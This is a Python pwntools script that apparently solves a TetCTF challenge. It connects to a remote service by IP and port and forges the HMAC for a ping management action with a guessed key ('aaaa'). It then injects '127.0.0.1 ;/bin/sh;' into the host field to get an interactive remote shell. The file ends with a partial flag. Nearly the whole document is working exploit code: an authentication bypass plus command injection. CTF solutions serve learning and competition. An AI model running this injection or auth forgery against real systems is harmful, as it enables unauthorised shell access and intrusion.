import hmac
from pwn import *
from json import loads
from time import time
import sys

class Client():
    
    def __init__(self, host, port): #remote
        self.r = remote(host, port)

    #def __init__(self, filename): #local
    #    self.r = process(filename)


    def Hmac(self, src, key):
        HMAC = hmac.new(key)
        HMAC.update(src)
        return HMAC.hexdigest().upper()

    def login(self, user, password):
        payload = "function=login&action=request&user=%s" %user
        self.r.sendline(payload)
        recv = self.r.recvline().strip()
        self.r.recvline()
        self.r.recvline()
        print (recv)
        res = loads(recv)
        if res['status'] == 1:
            return False
        self.challenge = res['data']['challenge'].encode()
        self.uuid = res['data']['uuid'].encode()
        self.publickey = res['data']['publickey'].encode()
        passwd = self.Hmac("%s%s" %(self.publickey, password), self.challenge)
        payload = "function=login&action=login&user=admin&pass=%s&uuid=%s" %(passwd, self.uuid)
        self.r.sendline(payload)
        recv = self.r.recvline().strip()
        self.r.recvline()
        self.r.recvline()
        res = loads(recv)
        if res['status'] == 1:
            return False
        self.privatekey = passwd
        return True

    def ping(self, host):
        timestamp = "%d" %time()
        action = "ping"
        auth = self.Hmac("%s%s" %(action, timestamp), "aaaa") #self.privatekey)
        payload = "function=manage&action=%s&timestamp=%s&auth=%s&uuid=&host=%s" %(action, timestamp, auth, host)
        self.r.sendline(payload)
        print (self.r.recvline().strip())
        self.r.recvline()
        self.r.recvline()

    def changepasswd(self, passwd):
        timestamp = "%d" %time()
        action = "changepasswd"
        auth = self.Hmac("%s%s" %(action, timestamp), self.privatekey)
        payload = "function=manage&action=%s&timestamp=%s&auth=%s&uuid=&pass=%s" %(action, timestamp, auth, passwd)
        self.r.sendline(payload)
        print (self.r.recvuntil("\n\n\n")[:-3])

cl = Client("18.234.92.13", 39669)
cl.ping("127.0.0.1 ;/bin/sh;")
cl.r.interactive()
#TetCTF{u_see_my_?day_0n_...}
